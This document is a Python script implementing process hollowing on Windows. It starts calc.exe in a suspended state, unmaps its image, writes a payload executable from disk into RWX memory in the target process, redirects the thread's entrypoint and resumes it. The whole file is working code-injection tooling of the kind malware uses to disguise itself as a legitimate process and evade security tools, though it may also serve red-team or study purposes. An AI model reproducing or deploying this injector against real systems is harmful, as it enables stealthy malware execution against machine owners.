import logging
import platform
import sys
from ctypes import FormatError, GetLastError, byref, c_size_t, create_string_buffer, sizeof, windll
from ctypes.wintypes import LPVOID

import pefile


from definitions import CONTEXT64, PROCESS_INFORMATION, STARTUPINFO, WOW64_CONTEXT
from definitions import CONTEXT_FULL, CREATE_SUSPENDED, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, WOW64_CONTEXT_FULL

USING_64_BIT = platform.architecture()[0] == '64bit'

PAYLOAD_EXE = r"Z:\32.exe"
TARGET_EXE = r"C:\WINDOWS\System32\calc.exe"

logger = logging.getLogger(__name__)

logging.basicConfig(
    format="[%(asctime)s] %(levelname)s: %(message)s",
    level=logging.DEBUG,
    datefmt="%Y-%m-%d %H:%M:%S",
)

startup_info = STARTUPINFO()
startup_info.cb = sizeof(startup_info)
process_info = PROCESS_INFORMATION()

logger.info(f"Starting {TARGET_EXE} in suspended state")
if windll.kernel32.CreateProcessA(
            None,
            create_string_buffer(bytes(TARGET_EXE, encoding="ascii")),
            None,
            None,
            False,
            CREATE_SUSPENDED,
            None,
            None,
            byref(startup_info),
            byref(process_info),
) == 0:
    logger.error(f"Error starting {TARGET_EXE}: {FormatError(GetLastError())}")
    sys.exit(1)
logger.debug(f"PID: {process_info.dwProcessId}")

logger.info(f"Reading {PAYLOAD_EXE}")
pe_payload = pefile.PE(PAYLOAD_EXE)
with open(PAYLOAD_EXE, "rb") as h_payload:
    payload_data = h_payload.read()
if pe_payload.PE_TYPE == pefile.OPTIONAL_HEADER_MAGIC_PE:
    logger.debug(f"{PAYLOAD_EXE} is 32-bit")
else:
    logger.debug(f"{PAYLOAD_EXE} is 64-bit")

logger.info("Getting thread context")
context = CONTEXT64() if USING_64_BIT else WOW64_CONTEXT()
context.ContextFlags = CONTEXT_FULL if USING_64_BIT else WOW64_CONTEXT_FULL
if windll.kernel32.GetThreadContext(process_info.hThread, byref(context)) == 0:
    logger.error(f"Error in GetThreadContext: {FormatError(GetLastError())}")
    sys.exit(1)

logger.info("Reading base address of process image")
target_image_base = LPVOID()
if windll.kernel32.ReadProcessMemory(
        process_info.hProcess,
        LPVOID((context.Rdx if USING_64_BIT else context.Ebx) + 2 * sizeof(c_size_t)),
        byref(target_image_base),
        sizeof(LPVOID),
        None
) == 0:
    logger.error(f"Error in ReadProcessMemory: {FormatError(GetLastError())}")
    sys.exit(1)
logger.debug(f"Base address of process: {hex(target_image_base.value)}")

if target_image_base == pe_payload.OPTIONAL_HEADER.ImageBase:
    logger.info("Unmapping target executable from the process ")
    if windll.ntdll.NtUnmapViewOfSection(process_info.hProcess, target_image_base) == 0:
        logger.error(f"Error in NtUnmapViewOfSection: {FormatError(GetLastError())}")
        sys.exit(1)

logger.info("Allocating memory in target process")
if USING_64_BIT:
    windll.kernel32.VirtualAllocEx.restype = LPVOID
allocated_address = windll.kernel32.VirtualAllocEx(
    process_info.hProcess,
    LPVOID(pe_payload.OPTIONAL_HEADER.ImageBase),
    pe_payload.OPTIONAL_HEADER.SizeOfImage,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE,
)
if allocated_address == 0:
    logger.error(f"Error in VirtualAllocEx: {FormatError(GetLastError())}")
    sys.exit(1)
logger.debug(f"Allocated memory at {hex(allocated_address)}")

logger.info(f"Writing payload headers to target process (to {hex(allocated_address)})")
if windll.kernel32.WriteProcessMemory(
            process_info.hProcess,
            LPVOID(allocated_address),
            payload_data,
            pe_payload.OPTIONAL_HEADER.SizeOfHeaders,
            None,
) == 0:
    logger.error(f"Error in WriteProcessMemory: {FormatError(GetLastError())}")
    sys.exit(1)

logger.info("Writing payload sections to target process")
for section in pe_payload.sections:
    section_name = section.Name.decode("utf-8").strip("\x00")
    logger.info(f"Writing section {section_name} (to {hex(allocated_address + section.VirtualAddress)})")
    if windll.kernel32.WriteProcessMemory(
            process_info.hProcess,
            LPVOID(allocated_address + section.VirtualAddress),
            payload_data[section.PointerToRawData:],
            section.SizeOfRawData,
            None,
    ) == 0:
        logger.error(f"Error in WriteProcessMemory: {FormatError(GetLastError())}")
        sys.exit(1)

logger.info("Setting new entrypoint")

if USING_64_BIT:
    context.Rcx = allocated_address + pe_payload.OPTIONAL_HEADER.AddressOfEntryPoint
    logger.debug(f"New entrypoint: {hex(context.Rcx)}")
else:
    context.Eax = allocated_address + pe_payload.OPTIONAL_HEADER.AddressOfEntryPoint
    logger.debug(f"New entrypoint: {hex(context.Eax)}")

logger.info("Writing base address of payload into the process")
if windll.kernel32.WriteProcessMemory(
        process_info.hProcess,
        LPVOID((context.Rdx if USING_64_BIT else context.Ebx) + 2 * sizeof(c_size_t)),
        payload_data[pe_payload.OPTIONAL_HEADER.get_field_absolute_offset("ImageBase"):],
        sizeof(LPVOID),
        None,
) == 0:
    logger.error(f"Error in WriteProcessMemory: {FormatError(GetLastError())}")
    sys.exit(1)

logger.info("Setting modified context")
if windll.kernel32.SetThreadContext(process_info.hThread, byref(context)) == 0:
    logger.error(f"Error in SetThreadContext: {FormatError(GetLastError())}")
    sys.exit(1)

logger.info("Resuming context")
if windll.kernel32.ResumeThread(process_info.hThread) == 0:
    logger.error(f"Error in ResumeThread: {FormatError(GetLastError())}")
    sys.exit(1)
